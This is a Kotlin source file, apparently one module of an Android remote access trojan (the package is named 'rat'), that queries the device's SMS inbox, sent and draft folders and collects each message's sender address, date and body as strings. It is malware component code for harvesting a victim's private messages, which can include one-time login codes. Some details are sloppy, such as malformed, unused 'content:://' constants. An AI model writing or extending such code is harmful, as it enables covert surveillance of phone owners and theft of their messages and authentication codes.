package ru.awawa.rat.helper

import android.content.Context
import android.net.Uri
import android.provider.Telephony

object SmsHelper {

    const val INBOX = "content:://sms/inbox"
    const val SENT = "content:://sms/sent"
    const val DRAFT = "content:://sms/DRAFT"

    fun readInbox(context: Context): Array<String> {
        val cursor = context.contentResolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            arrayOf(Telephony.Sms.Inbox.DATE_SENT, Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.BODY),
            null,
            null,
            Telephony.Sms.Inbox.DEFAULT_SORT_ORDER
        )

        if (cursor == null) {
            cursor?.close()
            return emptyArray()
        }

        val result = ArrayList<String>()
        if (cursor.moveToFirst()) {
            do {
                var msgData = ""
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx).toString() + ":" + cursor.getString(idx)
                }
                result.add(msgData)
            } while (cursor.moveToNext())
        }
        cursor.close()

        return result.toTypedArray()
    }

    fun readSent(context: Context): Array<String> {
        val cursor = context.contentResolver.query(
            Telephony.Sms.Sent.CONTENT_URI,
            arrayOf(Telephony.Sms.Sent.DATE_SENT, Telephony.Sms.Sent.ADDRESS, Telephony.Sms.Sent.BODY),
            null,
            null,
            Telephony.Sms.Sent.DEFAULT_SORT_ORDER
        )

        if (cursor == null) {
            cursor?.close()
            return emptyArray()
        }

        val result = ArrayList<String>()
        if (cursor.moveToFirst()) {
            do {
                var msgData = ""
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx).toString() + ":" + cursor.getString(idx)
                }
                result.add(msgData)
            } while (cursor.moveToNext())
        }
        cursor.close()

        return result.toTypedArray()
    }

    fun readDraft(context: Context): Array<String> {
        val cursor = context.contentResolver.query(
            Telephony.Sms.Draft.CONTENT_URI,
            arrayOf(Telephony.Sms.Draft.DATE_SENT, Telephony.Sms.Draft.ADDRESS, Telephony.Sms.Draft.BODY),
            null,
            null,
            Telephony.Sms.Draft.DEFAULT_SORT_ORDER
        )

        if (cursor == null) {
            cursor?.close()
            return emptyArray()
        }

        val result = ArrayList<String>()
        if (cursor.moveToFirst()) {
            do {
                var msgData = ""
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx).toString() + ":" + cursor.getString(idx)
                }
                result.add(msgData)
            } while (cursor.moveToNext())
        }
        cursor.close()

        return result.toTypedArray()
    }
}